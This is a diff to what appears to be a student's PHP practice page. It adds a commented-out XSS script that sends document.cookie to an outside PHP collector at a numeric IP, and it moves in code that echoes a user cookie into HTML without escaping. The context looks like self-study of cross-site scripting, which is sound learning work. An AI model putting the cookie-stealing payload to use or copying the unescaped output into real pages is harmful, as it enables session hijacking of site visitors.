@@ -6,6 +6,8 @@
     <h1>大佬首发</h1>
     <h2>小弟支持</h2>
 
+<!--    <script>window.open("http://202.192.32.64/phpstudy/xss.php?cookie="+document.cookie)</script>-->
+
 <?php
 echo "<p><b>大佬的第一份php</b></p>";
     echo "<ul>";
@@ -14,7 +16,14 @@ echo "<p><b>大佬的第一份php</b></p>";
     echo "大佬万岁！！！<br>";
     echo "<br><h2>嗯嗯，本大佬带你飞。</h2><br>";
     echo "而且不会翻车<br>";
-    echo "</ul>"
+    echo "</ul>";
+
+    if (isset($_COOKIE["user"]))
+        echo "<u><b>Welcome ".$_COOKIE["user"]."</b>!</u><br />";
+    else {
+        echo "Welcome guest!<br />";
+    }
+
 ?>
 
 <?php
@@ -29,6 +38,7 @@ echo "<p><b>大佬的第一份php</b></p>";
     $result = filter_input_array(INPUT_GET, $filters);
 
     if(!$result["age"]){
+        echo $result["age"]."<br>";
         echo "<h3>Age must be a number between 1 and 120</h3><br />";
         die();
     }
@@ -38,12 +48,6 @@ echo "<p><b>大佬的第一份php</b></p>";
     }
     else{
         echo "<h2>User input is vaild</h2><br>";
-    }
-
-    if (isset($_COOKIE["user"]))
-        echo "<u><b>Welcome ".$_COOKIE["user"]."</b>!</u><br />";
-    else {
-        echo "Welcome guest!<br />";
     }
 
     echo "<h3>php接收get请求</h3>";
@@ -65,6 +69,8 @@ echo "<p><b>大佬的第一份php</b></p>";
     }
 
 ?>
+
+
 </body>
 </html>
 
